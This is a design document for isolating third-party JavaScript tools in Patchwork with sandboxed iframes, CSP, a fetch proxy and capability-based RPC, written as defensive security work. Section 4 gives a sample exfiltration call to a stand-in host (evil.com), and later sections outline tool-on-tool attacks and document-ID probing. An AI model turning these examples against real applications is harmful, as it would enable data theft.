# Design: Third-Party Tool Isolation in Patchwork

## 1. Introduction

Patchwork is a local-first collaborative environment where users work with documents through **tools** — JavaScript modules that render and edit specific document types. Users can install third-party tools published by anyone. This creates a security problem: a malicious tool author could publish a tool that steals or damages the user's data.

This document explains the threat model, the challenges of isolating tools in a browser, and the reasoning behind the architectural decisions we've made. Each section presents a problem, the options we considered, the approach we chose, and how it relates to the threat model.

This document assumes familiarity with Automerge and local-first concepts. Browser security concepts (origins, iframes, CSP) are explained where they appear.

The POC aligned with the notes below is deployed https://tiny.grjte.sh. Try it out by installing and selecting the "isolated-frame" frame tool, which loads the main doc area in an isolated-patchwork-view (`automerge:221BNXiPhorK77ZRJfkzySbpP7Pr`) or this alternative "isolated-frame" which loads a patchwork-view and an isolated-patchwork-view side by side: `automerge:3i4EjTQqLhe2g1VQ9brGmLXkGSby`

## 2. Threat Model

Our chief concern is mischievous or malicious tool authors. We want users to be able to safely run third-party tools in their patchwork.

The attacker is a tool author who publishes a tool that users install. The attacker does not control the Patchwork host application or the sync server. The tool is standard JavaScript — it can do anything JavaScript can do within whatever execution context it's given.

We want to prevent two attacks:

1. **Unauthorized data access.** A tool must not access data that wasn't handed to it by the user. This includes documents belonging to other tools — accessing those could allow a malicious tool to damage the user's environment (for example, by modifying another tool's source code).

2. **Data exfiltration.** A tool must not send data it was given by the user to external servers or other unauthorized parties.

**Trust boundary.** The Patchwork host application and its built-in code are trusted. Third-party tool code is untrusted. Currently, only the main document view runs in the isolated context (`isolated-patchwork-view`). Sidebar and toolbar tools are assumed trusted — isolating them is future work.

**No server enforcement.** Patchwork is local-first. There is no server mediating tool access to documents. All isolation must happen in the browser, using the browser's own security primitives.

## 3. The Isolation Boundary: Why Sandboxed Iframes

### The problem

Third-party tool code is arbitrary JavaScript that needs to run in the user's browser. We need a way to run it in a restricted environment where it cannot access the host application's data or the user's browser state.

### Background: browser origins and same-origin policy

Browsers organize security around **origins**. An origin is defined by a URL's scheme, host, and port — for example, `https://example.com:443` is one origin and `https://other.com:443` is a different one. The browser enforces strict boundaries between origins: code running in one origin cannot read the DOM, cookies, localStorage, IndexedDB, or service worker registrations of another origin. This is the **same-origin policy**, and it is the strongest isolation primitive browsers provide.

An `<iframe>` creates a separate browsing context — essentially a page-within-a-page. If the iframe loads content from a different origin than the host page, the same-origin policy prevents the iframe from accessing the host's data, and vice versa.

The `sandbox` attribute on an iframe restricts what the iframe can do. Individual permissions are granted via flags:

- `allow-scripts` — lets the iframe run JavaScript. Without this, nothing executes.
- `allow-same-origin` — lets the iframe share the host page's origin. Without this, the iframe gets an **opaque origin**: a unique, unforgeable origin that is never the same as any other origin, including the host's.

### The proposed approach

We run third-party tools inside a `<iframe sandbox="allow-scripts">` using `srcdoc` (inline HTML content, no URL needed). Crucially, we **do not** include `allow-same-origin`.

This gives the iframe an opaque origin, which means:

- **No access to the host's DOM.** The iframe cannot read or modify anything in the host page.
- **No access to cookies or localStorage.** Attempting to access `localStorage` throws a `SecurityError`.
- **No access to IndexedDB.** The iframe cannot read or modify the host's document store.
- **No service worker access.** The iframe cannot register a service worker or intercept the host's network requests.
- **No shared state of any kind.** The iframe is completely isolated from the host at the browser level.

### Alternatives rejected

**`allow-same-origin` and "take IndexedDB away."** This was proposed as a simpler approach: give the iframe the host's origin (so it can use normal network and module loading) but remove access to IndexedDB by deleting `window.indexedDB` before tool code runs. We rejected this because `allow-same-origin` gives the iframe the host's **full** origin. With the same origin, the iframe can access the host's DOM, cookies, localStorage, and service workers — not just IndexedDB. And even for IndexedDB specifically, removing it via `delete window.indexedDB` is not enforceable: the iframe can recover the reference through other paths (creating a nested iframe, accessing a Worker's global scope, or using other browser APIs that expose storage). The browser's origin boundary is the only enforcement mechanism we can trust. Once you grant `allow-same-origin`, the sandbox is decorative.

**Web Workers with a virtual DOM proxy.** Run tool logic in a Web Worker (which provides strong isolation — no DOM, no shared memory by default) and proxy DOM operations back to the main thread. The Worker would send serialized DOM mutations (createElement, setAttribute, appendChild, event listeners) over a MessagePort, and the main thread would apply them to a real DOM element. We rejected this because it requires a virtual DOM bridge that faithfully reproduces all DOM behavior: event bubbling, focus management, layout queries (`getBoundingClientRect`, `offsetWidth`), CSS animations, and framework-specific integration (React, Solid, vanilla DOM all interact with the DOM differently). The impedance mismatch would make existing tools incompatible without significant rewriting. The iframe approach lets tools use the real DOM directly.

**Separate-origin iframes (per-tool subdomain).** Giving each tool its own subdomain (e.g., `tool-abc.patchwork.local`) would provide a real cross-origin boundary with full browser enforcement. But it requires DNS infrastructure or server configuration per tool (or for wildcard subdomains), complicates local-first deployment, and introduces CORS complexity for MessagePort communication between the host and iframe.

### Security notes

The opaque origin directly addresses **unauthorized data access**: a malicious tool cannot reach the host's IndexedDB (where Automerge documents are stored), localStorage, cookies, or DOM. It also provides a foundation for addressing **exfiltration** — though additional mechanisms (CSP, fetch proxying) are needed to fully prevent network-based exfiltration.

## 4. Preventing Data Exfiltration

### The problem

Even inside an opaque-origin iframe with `allow-scripts`, JavaScript can still make network requests. A malicious tool could call `fetch("https://evil.com/steal?data=...")`, open a `WebSocket`, create an `<img>` tag with a data-exfiltrating URL, or submit a form. If the tool has access to any user data (which it must, to be useful), it could send that data to an external server.

### Background: Content Security Policy (CSP)

**Content Security Policy** is a browser mechanism where a web page declares what types of resources it is allowed to load. The page provides a policy (a set of directives), and the browser enforces it — silently blocking any resource load that violates the policy. CSP policies are normally delivered via an HTTP header, but for `srcdoc` iframes (which have no HTTP response), they can be delivered via a `<meta http-equiv="Content-Security-Policy">` tag in the HTML.

### The proposed approach

We decided to start by applying a restrictive CSP to the sandboxed iframe, which could be relaxed after discussion if needed. We start from `default-src 'none'` (deny everything not explicitly allowed):

- **`connect-src blob:`** — blocks all programmatic network requests except blob URLs. This means `fetch()`, `XMLHttpRequest`, `WebSocket`, and `EventSource` all fail when targeting any real URL. This is the primary exfiltration prevention mechanism.

- **`script-src 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval' blob:`** — allows inline scripts, `eval()`, WebAssembly compilation, and blob-URL scripts. These are required by es-module-shims (explained in section 6), which uses `eval()` for module instantiation and blob URLs for module execution. `unsafe-eval` is a known tradeoff: it allows a tool to use `eval()` and `new Function()`, but since a tool that can load arbitrary module source already has code execution, `eval` does not meaningfully expand the attack surface.

- **`img-src <host-origin> blob: data:`** — tools need to render images from their own packages (served through the host origin) and from inline data URLs.

- **`style-src <host-origin> blob: 'unsafe-inline'`** — tools need the host's stylesheets and inline styles for rendering.

- **`font-src <host-origin> blob: data:`** and **`media-src <host-origin> blob: data:`** — same rationale as images.

- **`worker-src 'none'`** — prevents tools from spawning Web Workers, which would create additional execution contexts that might have different restrictions.

- **`frame-src 'none'`** — prevents nested iframes, which could be created with different sandbox flags.

- **`form-action 'none'`** — prevents form submissions, a classic data exfiltration technique (the browser sends a POST request to an arbitrary URL).

- **`base-uri 'none'`** — prevents `<base>` tag injection, which could redirect relative URLs.

CSP is defense in depth on top of the sandbox. The sandbox provides the isolation boundary (opaque origin); CSP ensures that even within that boundary, a tool cannot make network requests to exfiltrate data.

### Security notes

`connect-src blob:` directly prevents a tool from sending data to external servers — this addresses **exfiltration**. `worker-src 'none'` and `frame-src 'none'` prevent tools from creating execution contexts that might escape other restrictions.

**Gap:** The `img-src`, `style-src`, `font-src`, and `media-src` directives allow the browser to fetch resources from the host origin. A tool could insert `<img src="http://host/some-path">` and the browser would make the request directly — bypassing the fetch proxy (section 7). The tool cannot read the response content as data (CSP blocks that), but it can detect whether the resource exists via `onload`/`onerror` events, and it can observe timing. This is a limited information leak, not full exfiltration, and it's acceptable for our threat model.

## 5. The Automerge Repo Inside the Iframe

### The problem

Tools use Automerge's `Repo` and `DocHandle` APIs to read and modify documents. A tool calls `repo.find(url)` to get a document handle, `handle.doc()` to read the current state, and `handle.change()` to make edits. This is the standard API that all existing tools are built against — we can't change it without rewriting every tool.

The iframe needs its own Automerge Repo instance so tools can use these APIs. But the iframe can't access the host's IndexedDB (opaque origin), so it needs a way to get document data from the host.

### The proposed approach

The iframe creates an **ephemeral Repo** — an Automerge Repo instance with no storage adapter. Documents exist only in memory for the duration of the session.

The iframe repo connects to the host repo via a `MessageChannelNetworkAdapter` on a dedicated MessagePort. When the iframe calls `repo.find(url)`, the Automerge sync protocol sends a request over this port to the host repo. The host repo syncs the document back. From the tool's perspective, `repo.find()` works normally — it just takes a moment for the data to arrive over the sync channel rather than loading from local storage.

The iframe repo's `sharePolicy` is set to `() => true`, which is Automerge's default: share all known documents generously with all connected peers. The host repo also uses a generous share policy. This means both sides will respond to sync requests for any document without restriction.

### Security notes

A malicious tool can call `repo.find()` with any document URL — not just the document it was opened with — and the host repo will sync it. This gives the tool full read/write access to the user's entire document store. However, if the iframe repo needs to be aware of the documentId in order to get the document then this is not a severe gap for our threat model.

The iframe does not have network access, so I see 4 ways for it to get documents:

1. the urls/ids are provided by to the iframe by the host (authorized & unauthorized access are possible)
2. the urls/ids are provided to the iframe tool by the user (authorized access)
3. the urls/ids are hard-coded into a tool's source code (unauthorized access)
4. brute force - it could blindly test for random valid AutomergeUrls / DocumentIds (unauthorized access)

#### document ids provided by the host

We want to provide documents which have been explicitly shared by the user (e.g. the user opens a document, which causes it to be opened in a tool in the iframe, or the user opens a folder which has links to other documents. In this case, I believe it's acceptable to consider the consent to be transitive.)

We want to prevent sharing any other documents. An important case of this is allowing tools to execute other tools without leaking the documents such that they could be modified, which is addressed in section 9.

#### documents provided by the user

We want to be as permissive as possible on this point. If the user inputs a url or drags in a document or tries to do any sort of "normal work" using their documents, we want to avoid excessive access requests.

#### documents hard-coded into the tool's source code

The risk with this is exfiltration. If a tool has a hard-coded AutomergeUrl then it could read documents that the user has shared, write the contents to the hard-coded document, and exfiltrate data by sync. The clearest way to prevent this is to disallow hard-coded AutomergeUrls and document ids, if possible.

#### brute force

If we decide we're worried about this, we could throttle repo requests.

#### security conclusion

One obvious approach is to protect documents by filtering and explicitly allow-listing what can be synced, but this is very heavy-handed and will interfere with our usage goals, causing high UX pain for point (2) above.

It seems better to firsty try protecting against the cases identified above by other means.

#### Questions

- If I understand sharePolicy correctly, then the generous share policy means that everything the peer knows about will be shared. We want this from the iframe side, but we don't want this from the host side. The host should only share documents that the iframe repo explicitly requests. This is something I need to check on.
- are we concerned about (4) the brute force attempt to discover unauthorized documents?

## 6. Loading Tool Code Without Network Access

### The problem

Outside the sandbox, tools are loaded via the host's **service worker**. The service worker intercepts fetch requests for automerge URLs (`automerge:xyz...`) and serves the corresponding module source from the Automerge document store. **Import maps** (a browser feature that maps bare specifiers like `"@automerge/automerge-repo"` to concrete URLs) resolve library dependencies to service-worker-handled URLs. Together, service worker + import maps form a seamless module loading pipeline.

Inside the opaque-origin iframe, none of this works:

- The iframe **cannot access the host's service worker** — service workers are registered per-origin, and the iframe has an opaque origin.
- The iframe **cannot fetch anything** — CSP's `connect-src blob:` blocks all network requests (including to the host origin).
- The iframe **cannot use native import maps** — even if we embedded an import map in the srcdoc HTML, the browser would need network access to fetch the mapped URLs, which CSP blocks.

Yet we need to load the tool's full module graph plus all its framework dependencies.

### The proposed approach

We use **es-module-shims**, a library that polyfills ES module loading in the browser. The key feature is its **async `source` hook**: every time the browser would normally fetch a module URL, es-module-shims intercepts the request and calls our hook function instead. Our hook sends the URL to the host via message passing (over a MessagePort channel) and receives the module source text back. The host fetches the real source (using its service worker and normal network access) and returns it.

es-module-shims also provides `addImportMap()`, which lets us inject the host's resolved import map at runtime — working around the fact that native import maps are static and evaluated at page load.

### Security notes

All module source passes through the host before reaching the iframe. Because the host can inspect and transform source text, it rewrites automerge URL literals in module source to hide tool source code document IDs (see section 9). We could use this approach to address unauthorized access to documents via hard-coded urls/ids in tool source code, though this hasn't been done yet.

## 7. Fetching Tool Dependencies and Assets

### The problem

Tools and their dependencies call `fetch()` at runtime for CSS files, images, WASM binaries, JSON data, and other assets. Inside the sandbox, CSP blocks real `fetch()` — `connect-src blob:` means any attempt to fetch a real URL fails. Without a workaround, tools can't load any of their runtime dependencies.

### The proposed approach

We replace the iframe's `self.fetch` with a proxy function. When tool code calls `fetch(url)`, the proxy sends the URL to the host via the message-passing channel. The host fetches the resource on the iframe's behalf (using its normal network access and service worker) and returns the response body back to the iframe, which wraps it in a `Response` object.

**GET and HEAD only.** The fetch proxy rejects any request method other than GET or HEAD, and rejects any request that includes a body. This is defense in depth: even if a tool constructs a URL that somehow passes the resource policy, it cannot POST data to an external server.

**ResourcePolicy.** Every proxied fetch request passes through a `RestrictivePolicy` on the host side:

- **Importmap URLs are always allowed** — these are the known set of framework and library module URLs that the host resolved at init time.
- **Same-origin URLs are allowed**, as long as they don't contain automerge document IDs in their path segments.
- **Cross-origin URLs are blocked** — this prevents a tool from using the fetch proxy to send data to external servers.
- **URLs containing automerge document IDs are blocked** — this prevents a tool from using the host's service worker URL resolution to read arbitrary documents through the fetch channel.

We will need to allow a small set of external URLs for some tools (e.g. OpenRouter). Ideally, the tool could provide a resource list. For the moment, we aim to allow as few external URLs as possible and hard-code the ones we need until we have a chance to deal with this elegantly. For this reason, the current ResourcePolicy is a placeholder/blunt instrument that needs to become more fine-grained and tool-specific.

### Security notes

Cross-origin blocking directly addresses **exfiltration** through the fetch proxy channel. Automerge-ID blocking addresses **unauthorized access** via the host's service worker URL resolution.

**Gap:** Browser-initiated resource loads (`<img src="...">`, CSS `@font-face url()`, etc.) bypass the fetch proxy entirely — the browser makes these requests directly. CSP allows `img-src`, `style-src`, `font-src`, and `media-src` from the host origin, so these requests succeed. A tool cannot read the response content as text, but can probe for resource existence and observe timing. This is not a concern for our threat model.

## 8. Managing Communication Complexity

### The problem

The iframe communicates with the host for many purposes: module loading (section 6), fetch proxying (section 7), registry queries (section 10), event forwarding (document navigation, tool mount notifications), and registry push updates (when the host discovers new tools). In the future, Paul's work on Providers will be included in this list. All of this initially ran over raw `postMessage` on a single MessagePort, with manual request/response correlation, error handling, and type checking. As the number of message types grew, the protocol became fragile and hard to extend.

### The proposed approach

We adopted **capnweb**, an object-capability RPC library that runs over MessagePort. Instead of sending raw messages and correlating responses manually, the host and iframe each expose typed method interfaces. The iframe calls `hostStub.loadModuleSource(url)` and gets back a promise — capnweb handles the serialization, correlation, and error propagation.

**Object-capability semantics.** In a traditional API, any code that can reach the API can call any method on it (ambient authority). In an object-capability system, access is mediated through explicit object references. The host creates a `PluginRegistryCapability` object (section 10) and passes it to the iframe — the iframe can only call the methods on that specific object. If we want to grant the iframe additional capabilities later, we pass additional objects. This makes it easy to reason about what the iframe can and cannot do.

### The bootstrap problem

capnweb is itself a JavaScript module that must be loaded into the iframe. But one goal of this change is to route our module loading mechanism (es-module-shims + source hook) through RPC, which creating a chicken-and-egg dependency. We solve this with one additional **bootstrap MessagePort**:

1. **Bootstrap port.** A temporary, minimal postMessage-based RPC channel. It only serves URLs from the resolved import map — a small, known-safe set. It's used to load es-module-shims (injected as inline `<script>` text) and then to load capnweb via `importShim("capnweb")`. Once capnweb is loaded, the bootstrap port is **closed** — it exists for the shortest possible window.

2. **RPC port.** A capnweb RPC session. After capnweb loads, the es-module-shims source hook and the fetch proxy are rewired to use this channel. All subsequent communication goes through capnweb with full type safety and capability scoping.

3. **Repo port.** The Automerge document sync channel. This already existed before the bootstrap port was introduced — it carries only the Automerge sync protocol and is separate from RPC because document sync is continuous and high-throughput with its own message framing.

### Security notes

The bootstrap port is the least-auditable channel — simple postMessage with no type safety. Restricting it to importmap URLs only and closing it immediately after capnweb loads minimizes the window of exposure.

Object-capability semantics address both attacks in the threat model: the iframe can only call methods the host explicitly exposed. There is no ambient access to host internals — a tool cannot discover or invoke capabilities it wasn't given.

## 9. Executing Tools Without Exposing Tool Source Documents

### The problem

Tool source code is stored in Automerge documents. The URLs that reference tool modules contain Automerge document IDs — for example, `http://host/%automerge%3A4NMFnXJs2yE87RFXMq3bfU.../dist/index.js`. If the iframe sees these document IDs, a malicious tool could call `repo.find()` on them to access — and modify — another tool's source code. This is a **tool-on-tool attack**: a malicious tool corrupts the source code of a legitimate tool, and every user who subsequently loads the legitimate tool gets compromised.

### The proposed approach

**Design principle:** Automerge document IDs must never flow from host to iframe through the module-loading or registry paths.

The `PackageUrlMapper` (per-iframe, per-session) replaces automerge document ID segments in URLs with the package name from `package.json`:

```
Real:    http://host/%automerge%3A4NMFnXJs2yE87RFXMq3bfU.../dist/index.js
Package: http://host/pkg:@patchwork--folder/dist/index.js
```

When the iframe requests a module at `http://host/pkg:@patchwork--folder/dist/helper.js`, the host maps `@patchwork--folder` back to the real automerge document ID, fetches the source, and returns it. The package name is human-readable for debugging but cannot be used to `repo.find()` anything.

**Source text rewriting.** Tool module source code may contain hardcoded import URLs with automerge document IDs (e.g., in plugin registration metadata). Before sending source text to the iframe, `rewriteAutomergeUrls()` scans the text and replaces any automerge URL literals associated with plugin packages with their package URL equivalents. This is also a proof of concept which can be improved.

### Security notes

Opaque URL mapping addresses **unauthorized data access** — specifically, it prevents a tool from discovering the automerge document IDs of other tools' source code.

**Known gaps:**

- The `@patchwork.suggestedImportUrl` field in document CRDT state contains the raw automerge URL of the tool that created the document. This field syncs to the iframe through the Automerge repo channel — completely bypassing the package URL mapping, since the tool can extract these URLs. See section 13.
- Source text rewriting can be fragile, so I don't generally like this type of approach. The current handling only rewrites the specific module URL in its own source. For this case, there should be a consistent pattern to where these URLs appear so we should be able to do it better than it's done now. If other AutomergeUrls are contained in the source, they aren't currently protected

## 10. Tools Loading Other Tools and Plugins

### The problem

Tools aren't isolated units — they compose. A main tool often needs to load other tools or plugins from the registry:

- Tools like `patchwork-tools/space` and `patchwork-base/folder` render child documents using other tools. A folder lists documents and renders each with the appropriate tool via `<patchwork-view>`.
- Tools like `patchwork-base/codemirror-base` load all plugins of a given registry type — for example, `getRegistry("codemirror:extension").filter(...).loadAll(...)` discovers and loads all CodeMirror extensions.

These lookups use **synchronous** registry APIs that expect local, in-memory data. Inside the iframe, the registries start empty. Making every registry lookup async would require rewriting every existing tool that uses these APIs.

### The proposed approach

At boot, the iframe calls the host's `PluginRegistryCapability` to enumerate all registered plugins across all registry types. Each plugin's metadata includes an rewritten `importUrl` based on the package name (section 9). The iframe registers each as a local `LoadablePlugin` whose `load()` function calls `importShim(meta.importUrl)` — triggering RPC-backed module loading on demand. After boot, the host pushes registry updates to the iframe when plugins are re-registered (e.g., after `ModuleWatcher` discovers a newer version).

Existing synchronous registry APIs (`getRegistry().filter()`, `getFallbackTool()`, `getSupportedToolsForType()`) work unchanged — they query the pre-populated local registries. Module code is only fetched from the host when `load()` is actually called.

### Security notes

The iframe receives metadata for **all** installed tools and datatypes, not just those relevant to the current document. A malicious tool can enumerate every tool and datatype in the user's workspace. This is a low-severity information disclosure — the metadata contains names, IDs, and supported datatypes, but no document content or real automerge document IDs (those are rewritten to package names in `importUrl`).

Do we consider knowledge of all installed plugins to be unauthorized data access? I think it's ok as long as exfiltration is successfully prevented.

## 11. Styling Tools Inside the Iframe

### The problem

There is no consistent styling approach across tools. Some tools bundle their own CSS, but many — like the folder tool — use Tailwind and DaisyUI utility classes (`card`, `badge`, `flex`, `p-4`, etc.) that are compiled into the host page's CSS. Inside the opaque-origin iframe, the host's stylesheets are not available. Tools that rely on them render unstyled or broken.

### The proposed approach

At init time, the host collects all stylesheets from the page — both inline `<style>` tags and external `<link rel="stylesheet">` hrefs (fetched as text) — and sends the concatenated CSS to the iframe as part of the init message. The iframe injects it as a `<style>` tag in `<head>` before any tools render.

This is a pragmatic solution. It couples the iframe's styles to the host page's CSS build (CSS changes in the host are reflected in the iframe only after reload), but it lets existing tools render correctly without modification. Tools that bundle their own CSS or load it via `fetch()` also work — through the fetch proxy (section 7).

### Security notes

Injecting host CSS is a one-way, read-only operation — the iframe receives styles but cannot modify the host's stylesheets. No significant threat model impact.

## 12. Open Problem: Plugin Discovery in Host Context

### The problem

When a tool is installed, the host needs to know what plugins it provides — their IDs, types, supported datatypes, icons, and so on — in order to populate the plugin registry. Currently, `ModuleWatcher` discovers new tool packages and calls `import()` on each tool's entry module (the file that exports the `plugins` array) to read this metadata.

The problem is that `import()` runs the entry module in the **host page context** — not inside any sandbox. The module's top-level code executes with full privileges: access to the host's DOM, IndexedDB, network, Automerge Repo, and every other browser API. A malicious tool could put side effects in its entry module (rather than in the lazy `load()` function) to compromise the host before any isolation boundary is involved.

### Why it works this way

The plugin system was designed before isolation was added. The host needs metadata to populate registries — and the module's `plugins` export is the canonical source of that metadata. For well-behaved tools, the entry module just defines metadata objects with lazy `load()` functions. But nothing enforces this.

### Current state

This is the most severe gap in the isolation architecture. It bypasses the iframe sandbox entirely — all the protections described in sections 3–11 are irrelevant if a tool's entry module runs in the host context first.

Possible directions include requiring static metadata manifests (in `package.json` or a separate JSON file, so the host never imports the module) or sandboxed discovery (running the import in a separate sandboxed context and extracting metadata via RPC).

## 13. Open Problem: Tool Document IDs Leaking Through Document Content

### The problem

Most documents contain a `@patchwork.suggestedImportUrl` field set to the raw automerge URL of the tool package that created them. This field is part of the document's state — it syncs to any peer that has the document, including the iframe's ephemeral repo.

A malicious tool can extract `suggestedImportUrl` values to discover other tools' source code document IDs. This completely bypasses the package URL mapping (section 9), which carefully hides these IDs through the module-loading and registry paths.

### Why this matters

Combined with unrestricted repo access (section 5), this enables tool-on-tool attacks: a malicious tool reads `suggestedImportUrl` from documents, uses `repo.find()` to access the tool source document, and calls `handle.change()` to inject malicious code. Every user who subsequently loads the compromised tool gets attacked.

### Current state

Possible directions include removing the `suggestedImportUrl` field entirely (using the plugin registry to resolve which tool handles a document type, rather than embedding the URL in document content) or restricting what documents can be synced through the repo (section 5), which would limit a tool's ability to read `suggestedImportUrl` from documents it wasn't given.

## 13. Open Problem: issues with current tools

A quick list of issues to address with current tools

- tldraw assets fail to load because we depend on tldraw's CDN which is blocked by our CSP which prevents cross-origin fetch. This affects tldraw4, space, and likely others. Possible solutions:
  - self-host the assets bundled into the tool. This seems like the best approach, though some (solvable) issues popped up initially when I tried it. I didn't put significant time into debugging this while proving out the concepts above.
  - self-host the assets on the site outside of the tool. I have pragmatically done this for the moment to get it working without requiring resolving the issue above
  - allow the tldraw CDN in the iframe CSP. I think we should try to avoid putting exceptions into the CSP, but I do think this one is unlikely to be a security vulnerability so this could also be a pragmatic short-term solution if we intend to move to the first option.
- tools that use the account doc: sideboard, module-settings-manager, context-sidebar, settings, account
  - these tools should be reworked a bit so that the account doc is never passed in to a tool directly, and then I think we should see if we can explicitly prevent that document from syncing to an iframe repo
  - currently the tools which open in the non-sandboxed sidebars work, but I think we should sandbox the sidebars in the future so people can bring their own 3rd-party sidebar tools
  - the tools which open in the main document area do not work properly when that area is opened in the isolated frame. These tools are module-settings-manager, settings, account. We should consider how we want to resolve this. Providers can probably help.

## 14. Open Problem: integrating providers

I got this working by adding the provider request/response to the capnweb RPC. It required some minor adjustments to this POC because of the changes to patchwork-view.

One big security question to think about - providers can request/respond with anything. In the existing example providers this is mostly tied to a specific document url, but it doesn't have to be. We need to think this through carefully, which I haven't done yet.

## 15. Open Problem: from `isolated-patchwork-view` -> `patchwork-box` or `withIsolation()`

This POC was implemented by creating a drop-in replacement for patchwork-view that provides all of the isolation and mechanics described above, so it has the same element shape as the old patchwork-view. I took this approach because it was simple to test while working through the challenges above.

chee has proposed `<patchwork-box>` which would go around a `<patchwork-view>` instead. Using something more generic is appealing to me too.

Paul has proposed moving from `<patchwork-view>` to functions like `(element: HTMLElement) => () => void` (implemented in his [Providers PR](https://github.com/inkandswitch/patchwork-next/pull/288)), which could then have a `withDocHandle()` wrapper or a `withIsolation()` wrapper.

I think we should move to a better approach than `isolated-patchwork-view` in one of these directions, but for pragmatic reasons I propose merging the isolation work with `isolated-patchwork-view` and revisiting this afterwards as a distinct task.

## 16. Open Problems: List of open problems mentioned in previous sections:

- data exfiltration via hard-coded AutomergeUrls (section 5)
- brute force document discovery (section 5)
- tool-specific resource requests/white-listing for external URLs (section 7)
- better source rewriting / URL redaction for tool source code responses (section 5, section 9)

## 17. Summary of Security Layers

| Layer                          | Addresses                                                       | Current gaps                                        |
| ------------------------------ | --------------------------------------------------------------- | --------------------------------------------------- |
| Iframe sandbox (opaque origin) | Unauthorized access to DOM, storage, cookies, service workers   | None — enforced by the browser                      |
| Content Security Policy        | Network exfiltration, Workers, nested iframes                   | `img-src`/`style-src` allow host-origin probing     |
| Fetch proxy + ResourcePolicy   | Cross-origin exfiltration via RPC, automerge URL probing        | Browser-initiated loads bypass proxy                |
| Opaque URL mapping             | Tool source code document IDs hidden from iframe                | `suggestedImportUrl` leaks through document content |
| capnweb RPC + capabilities     | Scoped access — iframe can only call explicitly exposed methods | —                                                   |
| Host CSS injection             | Tool rendering compatibility                                    | Coupled to host CSS build                           |
| Registry pre-population        | Sync API compatibility with package URLs                        | Metadata leak (all plugins visible)                 |

### Open problems

1. **Plugin discovery in host context** (section 12) — tool entry modules execute with full host privileges before any sandbox is involved. Most severe gap.
2. **`suggestedImportUrl` leak** (section 13) — tool source document IDs exposed through document content, bypassing package URL mapping.
3. **Current tool compatibility** (section 13) — tldraw CDN assets blocked by CSP; account-doc-dependent tools need rework for sandboxed contexts.
4. **Provider security** (section 14) — providers can request/respond with anything; security implications not yet analyzed.
5. **Element architecture** (section 15) — `isolated-patchwork-view` is a pragmatic starting point; migration to `patchwork-box` or `withIsolation()` is planned.
6. **Data exfiltration via hard-coded automerge URLs** (section 5) — tool source may contain literal automerge URLs that leak document IDs.
7. **Brute force document discovery** (section 5) — a tool could guess document IDs and attempt `repo.find()`.
8. **Tool-specific resource whitelisting** (section 7) — no mechanism for per-tool external URL exceptions (e.g., tldraw CDN).
9. **Better source rewriting / URL redaction** (section 9) — current `rewriteAutomergeUrls` may not catch all forms of embedded automerge URLs in tool source.

The architecture provides meaningful isolation for tool rendering code. A tool running inside the sandbox cannot access the host's DOM, storage, or service workers; cannot make network requests to external servers; cannot see other tools' source code document IDs through the module-loading path; and uses the same APIs as before without modification. Full security requires addressing the open problems — especially host-context plugin execution, which bypasses the entire isolation architecture.
